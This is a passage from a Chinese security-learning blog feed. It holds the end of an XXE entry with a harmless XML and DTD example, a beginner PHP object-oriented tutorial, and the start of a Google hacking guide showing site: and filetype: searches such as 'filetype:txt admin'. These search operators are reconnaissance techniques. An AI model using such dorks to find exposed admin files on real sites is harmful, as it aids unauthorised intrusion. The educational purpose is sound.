<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>  <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">&quot;a.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>a.dtd文件<br>内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>+)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>
<p>看一下结果可以的</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>XXE漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>1.php面向对象基础</title>
    <url>/2020/10/17/1.php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p>类使用 class 关键字后加上类名定义<br>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">	xxxx</span><br><span class="line">	xxxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="初始化对象"><a href="#初始化对象" class="headerlink" title="初始化对象"></a>初始化对象</h2><p>用<code>new</code><br>然后用<code>var_dump()</code>打印出来属性<br>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> a();</span><br><span class="line">var_dump($b);</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017083037.png"></p>
<h2 id="创建类成员"><a href="#创建类成员" class="headerlink" title="创建类成员"></a>创建类成员</h2><ul>
<li>类成员分类<ul>
<li>成员变量(属性) 给对象存储的数据变量<ul>
<li>变量是可以改的</li>
</ul>
</li>
<li>成员函数(方法) 给对象调用解决问题的函数 </li>
<li>类常量 属性类内部的常量，使用<code>const</code>关键字定义<ul>
<li>常量是不可以改的</li>
</ul>
</li>
</ul>
</li>
<li>属性和方法需要用访问修饰符限制修饰符，使用<code>public</code>修饰</li>
</ul>
<p>咧：<br>函数用用修饰符应为他 默认就是<code>public</code>的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">	<span class="comment">//属性</span></span><br><span class="line">	<span class="keyword">public</span> $属性名 =值;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//常量</span></span><br><span class="line">	<span class="keyword">const</span> 变量名 =值;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> 方法名(<span class="params"><span class="string">&quot;行参&quot;</span></span>)</span>&#123;</span><br><span class="line">		xxxxx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="访问类成员"><a href="#访问类成员" class="headerlink" title="访问类成员"></a>访问类成员</h2><p>我们可以使用 <code>new</code>运算符来实例化该类的对象<br>简单就是说用<code>new</code>可以调用类<br>使用方法用的是<code>-&gt;</code><br>咧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b= <span class="keyword">new</span> 类名();</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问属性</span></span><br><span class="line"><span class="keyword">echo</span> $b-&gt;属性名;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改属性</span></span><br><span class="line">$b-&gt;属性名=<span class="string">&quot;值&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加属性</span></span><br><span class="line">$b-&gt;要添加的属性名=<span class="string">&quot;值&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除属性</span></span><br><span class="line"><span class="keyword">unset</span>($b-&gt;要删除的属性名)</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方法</span></span><br><span class="line">$b-&gt;方法名(<span class="string">&quot;实参&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="增删改查事例"><a href="#增删改查事例" class="headerlink" title="增删改查事例"></a>增删改查事例</h2><h3 id="查"><a href="#查" class="headerlink" title="查"></a>查</h3><p>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//属性</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//常量</span></span><br><span class="line">	<span class="keyword">const</span> TITLE =<span class="string">&quot;不好&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params">$i</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他好&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//访问属性</span></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;url;</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017092708.png"></p>
<h3 id="改"><a href="#改" class="headerlink" title="改"></a>改</h3><p>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//属性</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//常量</span></span><br><span class="line">	<span class="keyword">const</span> TITLE =<span class="string">&quot;不好&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params">$i</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他好&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//修改属性</span></span><br><span class="line">$a-&gt;url=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line"><span class="comment">//访问属性</span></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;url;</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017092949.png"></p>
<h3 id="增"><a href="#增" class="headerlink" title="增"></a>增</h3><p>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//属性</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//常量</span></span><br><span class="line">	<span class="keyword">const</span> TITLE =<span class="string">&quot;不好&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params">$i</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他好&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//增加属性</span></span><br><span class="line">$a-&gt;twourl=<span class="string">&quot;ccc&quot;</span>;</span><br><span class="line"><span class="comment">//访问属性</span></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;twourl;</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017093201.png"></p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>删除用到unset</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//属性</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//常量</span></span><br><span class="line">	<span class="keyword">const</span> TITLE =<span class="string">&quot;不好&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params">$i</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他好&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//删除属性</span></span><br><span class="line"><span class="keyword">unset</span> ($a-&gt;url);</span><br><span class="line"><span class="comment">//访问属性</span></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;url;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017093530.png"></p>
<h3 id="访问方法"><a href="#访问方法" class="headerlink" title="访问方法"></a>访问方法</h3><p>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//属性</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//常量</span></span><br><span class="line">	<span class="keyword">const</span> TITLE =<span class="string">&quot;不好&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他好&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//访问方法</span></span><br><span class="line">$a-&gt;setUrl();</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017094352.png"></p>
<h2 id="访问修饰限制符"><a href="#访问修饰限制符" class="headerlink" title="访问修饰限制符"></a>访问修饰限制符</h2><p>public (默认是他)   公共的类内外都访问<br>protected（受保护的）只允许在相关的类内部访问<br>private（私有的）  只允许在定义类内部访问</p>
<h3 id="public-公共的"><a href="#public-公共的" class="headerlink" title="public(公共的)"></a>public(公共的)</h3><p>函数默认就是<code>public</code><br>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//属性</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他好&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;url;</span><br><span class="line">$a-&gt;setUrl();</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017101829.png"></p>
<h3 id="protected（受保护的）"><a href="#protected（受保护的）" class="headerlink" title="protected（受保护的）"></a>protected（受保护的）</h3><p>咧：<br>受保护的是不能被访问的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//受保护的属性</span></span><br><span class="line">	<span class="keyword">protected</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他好&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;url;</span><br><span class="line">$a-&gt;setUrl();</span><br></pre></td></tr></table></figure>
<p>他会报错<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017160026.png"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>private（私有的）</p>
<p>咧：<br>受保护的是不能被访问的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//私有的属性</span></span><br><span class="line">	<span class="keyword">private</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他好&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;url;</span><br><span class="line">$a-&gt;setUrl();</span><br></pre></td></tr></table></figure>
<p>结果报错<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017155902.png">)</p>
<h2 id="内类部对象"><a href="#内类部对象" class="headerlink" title="内类部对象"></a>内类部对象</h2><h3 id="进行测访问内部对象"><a href="#进行测访问内部对象" class="headerlink" title="进行测访问内部对象"></a>进行测访问内部对象</h3><p>通过内部的函数访问类里面的变量<br>咧：<br>什么都没有显示<br>应为在类里面<code>setUrl</code>仍然是个函数<code>url</code>在函数外部是读取不了的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//受保护的属性</span></span><br><span class="line">	<span class="keyword">protected</span> $twourl=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//私有的属性</span></span><br><span class="line">	<span class="keyword">private</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//公用的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> $url;</span><br><span class="line">		<span class="keyword">echo</span> $twourl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line">$a-&gt;setUrl();</span><br></pre></td></tr></table></figure>
<p>结果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017155042.png"></p>
<h3 id="this的介绍"><a href="#this的介绍" class="headerlink" title="$this的介绍"></a>$this的介绍</h3><p><code>$this</code>方法内部的内置的一个对象仅限内部使用<br>他可以访问任何访问限制符的成员</p>
<p>类内部函数对函数以为类内的变量也是通过<code>$this</code>来访问的</p>
<p>通过<code>$this</code>可以访问全部的内容</p>
<p>咧：<br>先通过<code>var_dump()</code>来看一下<code>$this</code>的内容<br>下面结果可以看见通过<code>$this</code>可以访问全部的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//受保护的属性</span></span><br><span class="line">	<span class="keyword">protected</span> $twourl=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//私有的属性</span></span><br><span class="line">	<span class="keyword">private</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//公用的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">		var_dump(<span class="keyword">$this</span>);</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line">$a-&gt;setUrl();</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017162154.png"></p>
<h3 id="使用”-this”来访问私有和受保护的"><a href="#使用”-this”来访问私有和受保护的" class="headerlink" title="使用”$this”来访问私有和受保护的"></a>使用”$this”来访问私有和受保护的</h3><p>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//受保护的属性</span></span><br><span class="line">	<span class="keyword">protected</span> $twourl=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//私有的属性</span></span><br><span class="line">	<span class="keyword">private</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//公用的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twourl,<span class="keyword">$this</span>-&gt;url;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line">$a-&gt;setUrl();</span><br></pre></td></tr></table></figure>
<p>结果<br>可以访问<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201017162538.png"></p>
<h2 id="范围解析操作符”-”"><a href="#范围解析操作符”-”" class="headerlink" title="范围解析操作符”::”"></a>范围解析操作符”::”</h2><p>什么是范围解析操作符，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法<br>他可以实现类直接访问类成员，是专门实现类成员操作的，可以实现类直接访问类成员的<br><strong>语法</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">类名::类成员</span><br></pre></td></tr></table></figure>
<p>下面用一个普通的一个方法访问常量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//定义一个常量</span></span><br><span class="line">	<span class="keyword">const</span> PI =<span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//访问里面的常量</span></span><br><span class="line">$a-&gt;PI;</span><br></pre></td></tr></table></figure>
<p>结果就报错了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020094449.png"></p>
<p>我们就可以用范围解析操作符”::”了<br>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//定义一个常量</span></span><br><span class="line">	<span class="keyword">const</span> PI =<span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//范围解析操作符访问里面的常量</span></span><br><span class="line"><span class="keyword">echo</span> Site::PI;</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020095913.png"></p>
<p>他其实也可以直接访问操作类内的方法和属性但是不建议怎么做</p>
<h2 id="静态成员"><a href="#静态成员" class="headerlink" title="静态成员"></a>静态成员</h2><p>什么用静态成员：就是用<code>static</code>关键字来修饰的类成员，表示该成员属于类访问的<br>php有两个静态成员</p>
<ul>
<li>静态属性</li>
<li>静态方法</li>
</ul>
<p><strong>访问静态成员要用到范围解析操作符”::”</strong></p>
<h3 id="简单实例访问静态属性"><a href="#简单实例访问静态属性" class="headerlink" title="简单实例访问静态属性"></a>简单实例访问静态属性</h3><p>下面这个访问静态属性要叫上<code>$</code>符号</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//普通属性</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态属性用static来修饰</span></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  $PI=<span class="string">&quot;ccccc&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用范围解析操作符&quot;::&quot;来访问</span></span><br><span class="line"><span class="keyword">echo</span> Site::$PI; <span class="comment">//访问静态属性要叫上`$`符号</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020101940.png"></p>
<h3 id="访问方法静态方法"><a href="#访问方法静态方法" class="headerlink" title="访问方法静态方法"></a>访问方法静态方法</h3><p>实咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//普通属性</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态方法用static来修饰 </span></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span>  <span class="title">PI</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;cccc&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用范围解析操作符&quot;::&quot;来访问</span></span><br><span class="line"><span class="keyword">echo</span> Site::PI(); </span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020102436.png"></p>
<h3 id="在类的内部访问类内的静态属性"><a href="#在类的内部访问类内的静态属性" class="headerlink" title="在类的内部访问类内的静态属性"></a>在类的内部访问类内的静态属性</h3><p><strong>不建议这样使用</strong><br>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//普通属性</span></span><br><span class="line">	<span class="keyword">public</span> $url=<span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态属性用static来修饰</span></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  $Siteurl=<span class="string">&quot;ccccc&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态方法用static来修饰 </span></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span>  <span class="title">PI</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> Site::$Siteurl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用范围解析操作符&quot;::&quot;来访问</span></span><br><span class="line"><span class="keyword">echo</span> Site::PI(); </span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020102822.png"></p>
]]></content>
      <categories>
        <category>编程</category>
        <category>php</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>1.web信息收集之google搜索引擎</title>
    <url>/2020/10/27/1.web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>google hacking是Google搜索引擎准确搜索的技巧</strong><br>更多搜索技巧在<a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
<h2 id="site域名"><a href="#site域名" class="headerlink" title="site域名"></a>site域名</h2><p>site他的功能是用来搜索域名的网页内容，可以用来搜索子域名，跟子域名相关的内容</p>
<p>他指定那个站</p>
<p>语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:域名          &#x2F;&#x2F;他会搜索</span><br></pre></td></tr></table></figure>
<p>咧：<br>输入到是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:zhihu.com</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201026170957.png"></p>
<p><strong>搜索带关键字的</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:zhihu.com  “你好”</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201026171328.png"></p>
<h2 id="filetype文件类型"><a href="#filetype文件类型" class="headerlink" title="filetype文件类型"></a>filetype文件类型</h2><p>指定搜索文件类型<br>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filetype:txt</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201026173121.png"></p>
<p>也可以带关键字<br>咧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filetype:txt &quot;admin&quot;</span><br></pre></td></tr></table></figure>
